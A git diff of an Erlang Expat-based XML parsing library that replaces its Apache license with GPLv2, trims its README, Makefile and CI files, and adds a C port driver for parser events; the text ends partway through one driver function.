diff --git a/.gitignore b/.gitignore
index fce0ffc..e34a527 100644
--- a/.gitignore
+++ b/.gitignore
@@ -1,9 +1,6 @@
 .rebar/
 c_src/*.o
-c_src/*.d
 config.log
 config.status
 ebin
 priv/
-.eunit
-_build
diff --git a/.travis.yml b/.travis.yml
deleted file mode 100644
index 7d6616c..0000000
--- a/.travis.yml
+++ /dev/null
@@ -1,11 +0,0 @@
-sudo: false
-
-language: erlang
-
-install:
-  - rebar get-deps
-
-otp_release:
-  - 17.1
-  - 17.5
-  - 18.0
diff --git a/COPYING b/COPYING
new file mode 100644
index 0000000..d159169
--- /dev/null
+++ b/COPYING
@@ -0,0 +1,339 @@
+                    GNU GENERAL PUBLIC LICENSE
+                       Version 2, June 1991
+
+ Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
+ 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
+ Everyone is permitted to copy and distribute verbatim copies
+ of this license document, but changing it is not allowed.
+
+                            Preamble
+
+  The licenses for most software are designed to take away your
+freedom to share and change it.  By contrast, the GNU General Public
+License is intended to guarantee your freedom to share and change free
+software--to make sure the software is free for all its users.  This
+General Public License applies to most of the Free Software
+Foundation's software and to any other program whose authors commit to
+using it.  (Some other Free Software Foundation software is covered by
+the GNU Lesser General Public License instead.)  You can apply it to
+your programs, too.
+
+  When we speak of free software, we are referring to freedom, not
+price.  Our General Public Licenses are designed to make sure that you
+have the freedom to distribute copies of free software (and charge for
+this service if you wish), that you receive source code or can get it
+if you want it, that you can change the software or use pieces of it
+in new free programs; and that you know you can do these things.
+
+  To protect your rights, we need to make restrictions that forbid
+anyone to deny you these rights or to ask you to surrender the rights.
+These restrictions translate to certain responsibilities for you if you
+distribute copies of the software, or if you modify it.
+
+  For example, if you distribute copies of such a program, whether
+gratis or for a fee, you must give the recipients all the rights that
+you have.  You must make sure that they, too, receive or can get the
+source code.  And you must show them these terms so they know their
+rights.
+
+  We protect your rights with two steps: (1) copyright the software, and
+(2) offer you this license which gives you legal permission to copy,
+distribute and/or modify the software.
+
+  Also, for each author's protection and ours, we want to make certain
+that everyone understands that there is no warranty for this free
+software.  If the software is modified by someone else and passed on, we
+want its recipients to know that what they have is not the original, so
+that any problems introduced by others will not reflect on the original
+authors' reputations.
+
+  Finally, any free program is threatened constantly by software
+patents.  We wish to avoid the danger that redistributors of a free
+program will individually obtain patent licenses, in effect making the
+program proprietary.  To prevent this, we have made it clear that any
+patent must be licensed for everyone's free use or not licensed at all.
+
+  The precise terms and conditions for copying, distribution and
+modification follow.
+
+                    GNU GENERAL PUBLIC LICENSE
+   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
+
+  0. This License applies to any program or other work which contains
+a notice placed by the copyright holder saying it may be distributed
+under the terms of this General Public License.  The "Program", below,
+refers to any such program or work, and a "work based on the Program"
+means either the Program or any derivative work under copyright law:
+that is to say, a work containing the Program or a portion of it,
+either verbatim or with modifications and/or translated into another
+language.  (Hereinafter, translation is included without limitation in
+the term "modification".)  Each licensee is addressed as "you".
+
+Activities other than copying, distribution and modification are not
+covered by this License; they are outside its scope.  The act of
+running the Program is not restricted, and the output from the Program
+is covered only if its contents constitute a work based on the
+Program (independent of having been made by running the Program).
+Whether that is true depends on what the Program does.
+
+  1. You may copy and distribute verbatim copies of the Program's
+source code as you receive it, in any medium, provided that you
+conspicuously and appropriately publish on each copy an appropriate
+copyright notice and disclaimer of warranty; keep intact all the
+notices that refer to this License and to the absence of any warranty;
+and give any other recipients of the Program a copy of this License
+along with the Program.
+
+You may charge a fee for the physical act of transferring a copy, and
+you may at your option offer warranty protection in exchange for a fee.
+
+  2. You may modify your copy or copies of the Program or any portion
+of it, thus forming a work based on the Program, and copy and
+distribute such modifications or work under the terms of Section 1
+above, provided that you also meet all of these conditions:
+
+    a) You must cause the modified files to carry prominent notices
+    stating that you changed the files and the date of any change.
+
+    b) You must cause any work that you distribute or publish, that in
+    whole or in part contains or is derived from the Program or any
+    part thereof, to be licensed as a whole at no charge to all third
+    parties under the terms of this License.
+
+    c) If the modified program normally reads commands interactively
+    when run, you must cause it, when started running for such
+    interactive use in the most ordinary way, to print or display an
+    announcement including an appropriate copyright notice and a
+    notice that there is no warranty (or else, saying that you provide
+    a warranty) and that users may redistribute the program under
+    these conditions, and telling the user how to view a copy of this
+    License.  (Exception: if the Program itself is interactive but
+    does not normally print such an announcement, your work based on
+    the Program is not required to print an announcement.)
+
+These requirements apply to the modified work as a whole.  If
+identifiable sections of that work are not derived from the Program,
+and can be reasonably considered independent and separate works in
+themselves, then this License, and its terms, do not apply to those
+sections when you distribute them as separate works.  But when you
+distribute the same sections as part of a whole which is a work based
+on the Program, the distribution of the whole must be on the terms of
+this License, whose permissions for other licensees extend to the
+entire whole, and thus to each and every part regardless of who wrote it.
+
+Thus, it is not the intent of this section to claim rights or contest
+your rights to work written entirely by you; rather, the intent is to
+exercise the right to control the distribution of derivative or
+collective works based on the Program.
+
+In addition, mere aggregation of another work not based on the Program
+with the Program (or with a work based on the Program) on a volume of
+a storage or distribution medium does not bring the other work under
+the scope of this License.
+
+  3. You may copy and distribute the Program (or a work based on it,
+under Section 2) in object code or executable form under the terms of
+Sections 1 and 2 above provided that you also do one of the following:
+
+    a) Accompany it with the complete corresponding machine-readable
+    source code, which must be distributed under the terms of Sections
+    1 and 2 above on a medium customarily used for software interchange; or,
+
+    b) Accompany it with a written offer, valid for at least three
+    years, to give any third party, for a charge no more than your
+    cost of physically performing source distribution, a complete
+    machine-readable copy of the corresponding source code, to be
+    distributed under the terms of Sections 1 and 2 above on a medium
+    customarily used for software interchange; or,
+
+    c) Accompany it with the information you received as to the offer
+    to distribute corresponding source code.  (This alternative is
+    allowed only for noncommercial distribution and only if you
+    received the program in object code or executable form with such
+    an offer, in accord with Subsection b above.)
+
+The source code for a work means the preferred form of the work for
+making modifications to it.  For an executable work, complete source
+code means all the source code for all modules it contains, plus any
+associated interface definition files, plus the scripts used to
+control compilation and installation of the executable.  However, as a
+special exception, the source code distributed need not include
+anything that is normally distributed (in either source or binary
+form) with the major components (compiler, kernel, and so on) of the
+operating system on which the executable runs, unless that component
+itself accompanies the executable.
+
+If distribution of executable or object code is made by offering
+access to copy from a designated place, then offering equivalent
+access to copy the source code from the same place counts as
+distribution of the source code, even though third parties are not
+compelled to copy the source along with the object code.
+
+  4. You may not copy, modify, sublicense, or distribute the Program
+except as expressly provided under this License.  Any attempt
+otherwise to copy, modify, sublicense or distribute the Program is
+void, and will automatically terminate your rights under this License.
+However, parties who have received copies, or rights, from you under
+this License will not have their licenses terminated so long as such
+parties remain in full compliance.
+
+  5. You are not required to accept this License, since you have not
+signed it.  However, nothing else grants you permission to modify or
+distribute the Program or its derivative works.  These actions are
+prohibited by law if you do not accept this License.  Therefore, by
+modifying or distributing the Program (or any work based on the
+Program), you indicate your acceptance of this License to do so, and
+all its terms and conditions for copying, distributing or modifying
+the Program or works based on it.
+
+  6. Each time you redistribute the Program (or any work based on the
+Program), the recipient automatically receives a license from the
+original licensor to copy, distribute or modify the Program subject to
+these terms and conditions.  You may not impose any further
+restrictions on the recipients' exercise of the rights granted herein.
+You are not responsible for enforcing compliance by third parties to
+this License.
+
+  7. If, as a consequence of a court judgment or allegation of patent
+infringement or for any other reason (not limited to patent issues),
+conditions are imposed on you (whether by court order, agreement or
+otherwise) that contradict the conditions of this License, they do not
+excuse you from the conditions of this License.  If you cannot
+distribute so as to satisfy simultaneously your obligations under this
+License and any other pertinent obligations, then as a consequence you
+may not distribute the Program at all.  For example, if a patent
+license would not permit royalty-free redistribution of the Program by
+all those who receive copies directly or indirectly through you, then
+the only way you could satisfy both it and this License would be to
+refrain entirely from distribution of the Program.
+
+If any portion of this section is held invalid or unenforceable under
+any particular circumstance, the balance of the section is intended to
+apply and the section as a whole is intended to apply in other
+circumstances.
+
+It is not the purpose of this section to induce you to infringe any
+patents or other property right claims or to contest validity of any
+such claims; this section has the sole purpose of protecting the
+integrity of the free software distribution system, which is
+implemented by public license practices.  Many people have made
+generous contributions to the wide range of software distributed
+through that system in reliance on consistent application of that
+system; it is up to the author/donor to decide if he or she is willing
+to distribute software through any other system and a licensee cannot
+impose that choice.
+
+This section is intended to make thoroughly clear what is believed to
+be a consequence of the rest of this License.
+
+  8. If the distribution and/or use of the Program is restricted in
+certain countries either by patents or by copyrighted interfaces, the
+original copyright holder who places the Program under this License
+may add an explicit geographical distribution limitation excluding
+those countries, so that distribution is permitted only in or among
+countries not thus excluded.  In such case, this License incorporates
+the limitation as if written in the body of this License.
+
+  9. The Free Software Foundation may publish revised and/or new versions
+of the General Public License from time to time.  Such new versions will
+be similar in spirit to the present version, but may differ in detail to
+address new problems or concerns.
+
+Each version is given a distinguishing version number.  If the Program
+specifies a version number of this License which applies to it and "any
+later version", you have the option of following the terms and conditions
+either of that version or of any later version published by the Free
+Software Foundation.  If the Program does not specify a version number of
+this License, you may choose any version ever published by the Free Software
+Foundation.
+
+  10. If you wish to incorporate parts of the Program into other free
+programs whose distribution conditions are different, write to the author
+to ask for permission.  For software which is copyrighted by the Free
+Software Foundation, write to the Free Software Foundation; we sometimes
+make exceptions for this.  Our decision will be guided by the two goals
+of preserving the free status of all derivatives of our free software and
+of promoting the sharing and reuse of software generally.
+
+                            NO WARRANTY
+
+  11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
+FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
+OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
+PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
+OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
+TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
+PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
+REPAIR OR CORRECTION.
+
+  12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
+REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
+INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
+OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
+TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
+YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
+PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGES.
+
+                     END OF TERMS AND CONDITIONS
+
+            How to Apply These Terms to Your New Programs
+
+  If you develop a new program, and you want it to be of the greatest
+possible use to the public, the best way to achieve this is to make it
+free software which everyone can redistribute and change under these terms.
+
+  To do so, attach the following notices to the program.  It is safest
+to attach them to the start of each source file to most effectively
+convey the exclusion of warranty; and each file should have at least
+the "copyright" line and a pointer to where the full notice is found.
+
+    <one line to give the program's name and a brief idea of what it does.>
+    Copyright (C) <year>  <name of author>
+
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License along
+    with this program; if not, write to the Free Software Foundation, Inc.,
+    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+Also add information on how to contact you by electronic and paper mail.
+
+If the program is interactive, make it output a short notice like this
+when it starts in an interactive mode:
+
+    Gnomovision version 69, Copyright (C) year name of author
+    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
+    This is free software, and you are welcome to redistribute it
+    under certain conditions; type `show c' for details.
+
+The hypothetical commands `show w' and `show c' should show the appropriate
+parts of the General Public License.  Of course, the commands you use may
+be called something other than `show w' and `show c'; they could even be
+mouse-clicks or menu items--whatever suits your program.
+
+You should also get your employer (if you work as a programmer) or your
+school, if any, to sign a "copyright disclaimer" for the program, if
+necessary.  Here is a sample; alter the names:
+
+  Yoyodyne, Inc., hereby disclaims all copyright interest in the program
+  `Gnomovision' (which makes passes at compilers) written by James Hacker.
+
+  <signature of Ty Coon>, 1 April 1989
+  Ty Coon, President of Vice
+
+This General Public License does not permit incorporating your program into
+proprietary programs.  If your program is a subroutine library, you may
+consider it more useful to permit linking proprietary applications with the
+library.  If this is what you want to do, use the GNU Lesser General
+Public License instead of this License.
diff --git a/LICENSE.txt b/LICENSE.txt
deleted file mode 100644
index d645695..0000000
--- a/LICENSE.txt
+++ /dev/null
@@ -1,202 +0,0 @@
-
-                                 Apache License
-                           Version 2.0, January 2004
-                        http://www.apache.org/licenses/
-
-   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
-
-   1. Definitions.
-
-      "License" shall mean the terms and conditions for use, reproduction,
-      and distribution as defined by Sections 1 through 9 of this document.
-
-      "Licensor" shall mean the copyright owner or entity authorized by
-      the copyright owner that is granting the License.
-
-      "Legal Entity" shall mean the union of the acting entity and all
-      other entities that control, are controlled by, or are under common
-      control with that entity. For the purposes of this definition,
-      "control" means (i) the power, direct or indirect, to cause the
-      direction or management of such entity, whether by contract or
-      otherwise, or (ii) ownership of fifty percent (50%) or more of the
-      outstanding shares, or (iii) beneficial ownership of such entity.
-
-      "You" (or "Your") shall mean an individual or Legal Entity
-      exercising permissions granted by this License.
-
-      "Source" form shall mean the preferred form for making modifications,
-      including but not limited to software source code, documentation
-      source, and configuration files.
-
-      "Object" form shall mean any form resulting from mechanical
-      transformation or translation of a Source form, including but
-      not limited to compiled object code, generated documentation,
-      and conversions to other media types.
-
-      "Work" shall mean the work of authorship, whether in Source or
-      Object form, made available under the License, as indicated by a
-      copyright notice that is included in or attached to the work
-      (an example is provided in the Appendix below).
-
-      "Derivative Works" shall mean any work, whether in Source or Object
-      form, that is based on (or derived from) the Work and for which the
-      editorial revisions, annotations, elaborations, or other modifications
-      represent, as a whole, an original work of authorship. For the purposes
-      of this License, Derivative Works shall not include works that remain
-      separable from, or merely link (or bind by name) to the interfaces of,
-      the Work and Derivative Works thereof.
-
-      "Contribution" shall mean any work of authorship, including
-      the original version of the Work and any modifications or additions
-      to that Work or Derivative Works thereof, that is intentionally
-      submitted to Licensor for inclusion in the Work by the copyright owner
-      or by an individual or Legal Entity authorized to submit on behalf of
-      the copyright owner. For the purposes of this definition, "submitted"
-      means any form of electronic, verbal, or written communication sent
-      to the Licensor or its representatives, including but not limited to
-      communication on electronic mailing lists, source code control systems,
-      and issue tracking systems that are managed by, or on behalf of, the
-      Licensor for the purpose of discussing and improving the Work, but
-      excluding communication that is conspicuously marked or otherwise
-      designated in writing by the copyright owner as "Not a Contribution."
-
-      "Contributor" shall mean Licensor and any individual or Legal Entity
-      on behalf of whom a Contribution has been received by Licensor and
-      subsequently incorporated within the Work.
-
-   2. Grant of Copyright License. Subject to the terms and conditions of
-      this License, each Contributor hereby grants to You a perpetual,
-      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
-      copyright license to reproduce, prepare Derivative Works of,
-      publicly display, publicly perform, sublicense, and distribute the
-      Work and such Derivative Works in Source or Object form.
-
-   3. Grant of Patent License. Subject to the terms and conditions of
-      this License, each Contributor hereby grants to You a perpetual,
-      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
-      (except as stated in this section) patent license to make, have made,
-      use, offer to sell, sell, import, and otherwise transfer the Work,
-      where such license applies only to those patent claims licensable
-      by such Contributor that are necessarily infringed by their
-      Contribution(s) alone or by combination of their Contribution(s)
-      with the Work to which such Contribution(s) was submitted. If You
-      institute patent litigation against any entity (including a
-      cross-claim or counterclaim in a lawsuit) alleging that the Work
-      or a Contribution incorporated within the Work constitutes direct
-      or contributory patent infringement, then any patent licenses
-      granted to You under this License for that Work shall terminate
-      as of the date such litigation is filed.
-
-   4. Redistribution. You may reproduce and distribute copies of the
-      Work or Derivative Works thereof in any medium, with or without
-      modifications, and in Source or Object form, provided that You
-      meet the following conditions:
-
-      (a) You must give any other recipients of the Work or
-          Derivative Works a copy of this License; and
-
-      (b) You must cause any modified files to carry prominent notices
-          stating that You changed the files; and
-
-      (c) You must retain, in the Source form of any Derivative Works
-          that You distribute, all copyright, patent, trademark, and
-          attribution notices from the Source form of the Work,
-          excluding those notices that do not pertain to any part of
-          the Derivative Works; and
-
-      (d) If the Work includes a "NOTICE" text file as part of its
-          distribution, then any Derivative Works that You distribute must
-          include a readable copy of the attribution notices contained
-          within such NOTICE file, excluding those notices that do not
-          pertain to any part of the Derivative Works, in at least one
-          of the following places: within a NOTICE text file distributed
-          as part of the Derivative Works; within the Source form or
-          documentation, if provided along with the Derivative Works; or,
-          within a display generated by the Derivative Works, if and
-          wherever such third-party notices normally appear. The contents
-          of the NOTICE file are for informational purposes only and
-          do not modify the License. You may add Your own attribution
-          notices within Derivative Works that You distribute, alongside
-          or as an addendum to the NOTICE text from the Work, provided
-          that such additional attribution notices cannot be construed
-          as modifying the License.
-
-      You may add Your own copyright statement to Your modifications and
-      may provide additional or different license terms and conditions
-      for use, reproduction, or distribution of Your modifications, or
-      for any such Derivative Works as a whole, provided Your use,
-      reproduction, and distribution of the Work otherwise complies with
-      the conditions stated in this License.
-
-   5. Submission of Contributions. Unless You explicitly state otherwise,
-      any Contribution intentionally submitted for inclusion in the Work
-      by You to the Licensor shall be under the terms and conditions of
-      this License, without any additional terms or conditions.
-      Notwithstanding the above, nothing herein shall supersede or modify
-      the terms of any separate license agreement you may have executed
-      with Licensor regarding such Contributions.
-
-   6. Trademarks. This License does not grant permission to use the trade
-      names, trademarks, service marks, or product names of the Licensor,
-      except as required for reasonable and customary use in describing the
-      origin of the Work and reproducing the content of the NOTICE file.
-
-   7. Disclaimer of Warranty. Unless required by applicable law or
-      agreed to in writing, Licensor provides the Work (and each
-      Contributor provides its Contributions) on an "AS IS" BASIS,
-      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
-      implied, including, without limitation, any warranties or conditions
-      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
-      PARTICULAR PURPOSE. You are solely responsible for determining the
-      appropriateness of using or redistributing the Work and assume any
-      risks associated with Your exercise of permissions under this License.
-
-   8. Limitation of Liability. In no event and under no legal theory,
-      whether in tort (including negligence), contract, or otherwise,
-      unless required by applicable law (such as deliberate and grossly
-      negligent acts) or agreed to in writing, shall any Contributor be
-      liable to You for damages, including any direct, indirect, special,
-      incidental, or consequential damages of any character arising as a
-      result of this License or out of the use or inability to use the
-      Work (including but not limited to damages for loss of goodwill,
-      work stoppage, computer failure or malfunction, or any and all
-      other commercial damages or losses), even if such Contributor
-      has been advised of the possibility of such damages.
-
-   9. Accepting Warranty or Additional Liability. While redistributing
-      the Work or Derivative Works thereof, You may choose to offer,
-      and charge a fee for, acceptance of support, warranty, indemnity,
-      or other liability obligations and/or rights consistent with this
-      License. However, in accepting such obligations, You may act only
-      on Your own behalf and on Your sole responsibility, not on behalf
-      of any other Contributor, and only if You agree to indemnify,
-      defend, and hold each Contributor harmless for any liability
-      incurred by, or claims asserted against, such Contributor by reason
-      of your accepting any such warranty or additional liability.
-
-   END OF TERMS AND CONDITIONS
-
-   APPENDIX: How to apply the Apache License to your work.
-
-      To apply the Apache License to your work, attach the following
-      boilerplate notice, with the fields enclosed by brackets "[]"
-      replaced with your own identifying information. (Don't include
-      the brackets!)  The text should be enclosed in the appropriate
-      comment syntax for the file format. We also recommend that a
-      file or class name and description of purpose be included on the
-      same "printed page" as the copyright notice for easier
-      identification within third-party archives.
-
-   Copyright [yyyy] [name of copyright owner]
-
-   Licensed under the Apache License, Version 2.0 (the "License");
-   you may not use this file except in compliance with the License.
-   You may obtain a copy of the License at
-
-       http://www.apache.org/licenses/LICENSE-2.0
-
-   Unless required by applicable law or agreed to in writing, software
-   distributed under the License is distributed on an "AS IS" BASIS,
-   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-   See the License for the specific language governing permissions and
-   limitations under the License.
diff --git a/Makefile b/Makefile
index 07934d7..604af84 100644
--- a/Makefile
+++ b/Makefile
@@ -6,10 +6,7 @@ src:
 clean:
 	rebar clean
 
-test: all
-	rebar -v skip_deps=true eunit
+test:
+	rebar eunit
 
-check-syntax:
-	gcc -o nul -S ${CHK_SOURCES}
-
-.PHONY: clean src test all
+.PHONY: clean src test
diff --git a/README.md b/README.md
index ba970c3..c9c5491 100644
--- a/README.md
+++ b/README.md
@@ -1,73 +1,10 @@
-# Erlang and Elixir XML Parsing [![Build Status](https://travis-ci.org/processone/xml.svg?branch=master)](https://travis-ci.org/processone/xml) [![Coverage Status](https://coveralls.io/repos/processone/xml/badge.svg?branch=master&service=github)](https://coveralls.io/github/processone/xml?branch=master)
+# xml
 
-Fast Expat based Erlang XML parsing and manipulation library, with a
-strong focus on XML stream parsing from network.
+Fast Expat based Erlang XML parsing library, with a strong focus on XML stream parsing from network.
 
-It supports:
+Note: This module obsolete and supercede exmpp.
 
-- Full XML structure parsing: Suitable for small but complete XML chunks.
-- XML stream parsing: Suitable for large XML document, or infinite
-  network XML stream like XMPP.
-
-## Building
-
-Erlang XML parser can be build as follow:
-
-    ./configure && make
-
-Erlang XML parser is a rebar-compatible OTP application. Alternatively, you can build it with rebar:
-
-    rebar compile
-
-## Dependencies
-
-Erlang XML parser depends on Expat XML parser. You need development
-headers for Expat library to build it.
-
-You can use `configure` options to pass custom path to Expat libraries and headers:
-
-    --with-expat=[ARG]      use Expat XML Parser from given prefix (ARG=path);
-                            check standard prefixes (ARG=yes); disable (ARG=no)
-    --with-expat-inc=[DIR]  path to Expat XML Parser headers
-    --with-expat-lib=[ARG]  link options for Expat XML Parser libraries
-
-## xmlel record and types
-
-XML elements are provided as Erlang xmlel records.
-
-Format of the record allows defining a simple tree-like
-structure. xmlel record has the following fields:
-
-- name     :: binary()
-- attrs    :: [attr()]
-- children :: [xmlel() | cdata()]
-
-cdata type is a tuple of the form:
-
-    {xmlcdata, CData::binary()}
-
-attr type if a tuple of the form:
-
-    {Name::binary(), Value::binary()}
-
-## XML full structure parsing
-
-You can definitely parse a complete XML structure with `p1_xml`:
-
-```
-$ erl -pa ebin
-Erlang/OTP 17 [erts-6.3] [source] [64-bit] [smp:4:4] [async-threads:10] [hipe] [kernel-poll:false] [dtrace]
-
-Eshell V6.3  (abort with ^G)
-1> application:start(p1_xml). 
-ok
-2> xml_stream:parse_element(<<"<test>content cdata</test>">>).
-{xmlel,<<"test">>,[],[{xmlcdata,<<"content cdata">>}]}
-```
-
-## XML Stream parsing example
-
-You can also parse continuous stream. Here is an example XML stream parsing:
+XML streaming parser example:
 
 ```
 $ erl -pa ebin 
@@ -81,53 +18,37 @@ ok
 
 % Create a new stream, using self PID to received XML parsing event:
 2> S1 = xml_stream:new(self()).
-<<>>
+{xml_stream_state,<0.32.0>,#Port<0.751>,[],0,infinity}
 
 % Start feeding content to the XML parser.
-3> S2 = xml_stream:parse(S1, <<"<root>">>).
-<<>>
+3> S2 = xml_stream:parse(S1, <<"<test>">>).
+{xml_stream_state,<0.32.0>,#Port<0.751>,
+                  [xmlstreamstart],
+                  0,infinity}
 
 % Receive Erlang message send to shell process:
 4> flush().
-Shell got {'$gen_event',{xmlstreamstart,<<"root">>,[]}}
+Shell got {'$gen_event',{xmlstreamstart,<<"test">>,[]}}
 ok
 
 % Feed more content:
-5> S3 = xml_stream:parse(S2, <<"<xmlelement>content cdata</xmlelement">>).
-<<>>
+5> S3 = xml_stream:parse(S2, <<"content cdata">>).
+{xml_stream_state,<0.32.0>,#Port<0.751>,
+                  [xmlstreamstart],
+                  0,infinity}
 
 % Receive more messages:
-6> flush().
-Shell got {'$gen_event',
-              {xmlstreamelement,
-                  {xmlel,<<"xmlelement">>,[],
-                      [{xmlcdata,<<"content cdata">>}]}}}
+6> flush().                                       
+Shell got {'$gen_all_state_event',{xmlstreamcdata,<<"content cdata">>}}
 ok
 
 % Feed more content:
-7> S4 = xml_stream:parse(S3, <<"</root>">>).      
-<<>>
+7> S4 = xml_stream:parse(S3, <<"</test>">>).      
+{xml_stream_state,<0.32.0>,#Port<0.751>,[],7,infinity}
 
 % Receive messages:
 8> flush().
-Shell got {'$gen_event',{xmlstreamend,<<"root">>}}
+Shell got {'$gen_event',{xmlstreamend,<<"test">>}}
 ok
-
-9> xml_stream:close(S4).
-true
 ```
 
-Note how the root element is important. We expect to have the root
-element serve as boundary with stream start and stream end
-event. Then, lower level tags are passed as sub stream elements.
-
-## How does this module relate to exmpp ?
-
-This module is a low level fast XML parser. It is not an XMPP client
-library like [exmpp](https://processone.github.io/exmpp/).
-
-## References
-
-This module is use at large scale for parsing massive XML content in
-[ejabberd](https://www.ejabberd.im) XMPP server project. It is used in
-production in thousands of real life deployments.
diff --git a/c_src/expat_erl.c b/c_src/expat_erl.c
new file mode 100644
index 0000000..49f2eb4
--- /dev/null
+++ b/c_src/expat_erl.c
@@ -0,0 +1,351 @@
+/*
+ * Copyright (C) 2002-2015   ProcessOne
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of the
+ * License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+ * General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+ * 02111-1307 USA
+ *
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <erl_driver.h>
+#include <ei.h>
+#include <expat.h>
+
+
+#define XML_START 0
+#define XML_END   1
+#define XML_CDATA 2
+#define XML_ERROR 3
+
+#define PARSE_COMMAND 0
+#define PARSE_FINAL_COMMAND 1
+#define PARSING_NOT_RESUMABLE XML_FALSE
+
+/*
+ * R15B changed several driver callbacks to use ErlDrvSizeT and
+ * ErlDrvSSizeT typedefs instead of int.
+ * This provides missing typedefs on older OTP versions.
+ */
+#if ERL_DRV_EXTENDED_MAJOR_VERSION < 2
+typedef int ErlDrvSizeT;
+typedef int ErlDrvSSizeT;
+#endif
+
+ei_x_buff event_buf;
+ei_x_buff xmlns_buf;
+
+typedef struct {
+      ErlDrvPort port;
+      XML_Parser parser;
+} expat_data;
+
+static XML_Memory_Handling_Suite ms;
+
+void encode_name(const XML_Char *name)
+{
+  char *name_start;
+  char *prefix_start;
+  char *buf;
+  int name_len, prefix_len, buf_len;
+
+  if ((name_start = strchr(name, '\n'))) {
+    if ((prefix_start = strchr(name_start+1, '\n'))) {
+      name_len = prefix_start - name_start;
+      prefix_len = strlen(prefix_start+1);
+      buf_len = prefix_len + name_len;
+      buf = driver_alloc(buf_len);
+      memcpy(buf, prefix_start+1, prefix_len);
+      memcpy(buf+prefix_len, name_start, name_len);
+      buf[prefix_len] = ':';
+      ei_x_encode_binary(&event_buf, buf, buf_len);
+      driver_free(buf);
+    } else {
+       ei_x_encode_binary(&event_buf, name_start+1, strlen(name_start+1));
+    };
+  } else {
+     ei_x_encode_binary(&event_buf, name, strlen(name));
+  }
+}
+
+void *erlXML_StartElementHandler(expat_data *d,
+				 const XML_Char *name,
+				 const XML_Char **atts)
+{
+   int i;
+
+   ei_x_encode_list_header(&event_buf, 1);
+   ei_x_encode_tuple_header(&event_buf, 2);
+   ei_x_encode_long(&event_buf, XML_START);
+   ei_x_encode_tuple_header(&event_buf, 2);
+   encode_name(name);
+   ei_x_append(&event_buf, &xmlns_buf);
+   ei_x_free(&xmlns_buf);
+   ei_x_new(&xmlns_buf);
+
+   for (i = 0; atts[i]; i += 2) {}
+
+   if (i > 0)
+   {
+      ei_x_encode_list_header(&event_buf, i/2);
+
+      for (i = 0; atts[i]; i += 2)
+      {
+	 ei_x_encode_tuple_header(&event_buf, 2);
+	 encode_name(atts[i]);
+	 ei_x_encode_binary(&event_buf, atts[i+1], strlen(atts[i+1]));
+      }
+   }
+
+   ei_x_encode_empty_list(&event_buf);
+
+   return NULL;
+}
+
+void *erlXML_EndElementHandler(expat_data *d,
+			       const XML_Char *name)
+{
+   ei_x_encode_list_header(&event_buf, 1);
+   ei_x_encode_tuple_header(&event_buf, 2);
+   ei_x_encode_long(&event_buf, XML_END);
+   encode_name(name);
+   return NULL;
+}
+
+void *erlXML_CharacterDataHandler(expat_data *d,
+				  const XML_Char *s,
+				  int len)
+{
+   ei_x_encode_list_header(&event_buf, 1);
+   ei_x_encode_tuple_header(&event_buf, 2);
+   ei_x_encode_long(&event_buf, XML_CDATA);
+   ei_x_encode_binary(&event_buf, s, len);
+   return NULL;
+}
+
+void *erlXML_StartNamespaceDeclHandler(expat_data *d,
+				       const XML_Char *prefix,
+				       const XML_Char *uri)
+{
+  int prefix_len;
+  char *buf;
+
+  /* From the expat documentation:
+     "For a default namespace declaration (xmlns='...'),
+     the prefix will be null ...
+     ... The URI will be null for the case where
+     the default namespace is being unset."
+
+     FIXME: I'm not quite sure what all that means */
+  if (uri == NULL)
+      return NULL;
+
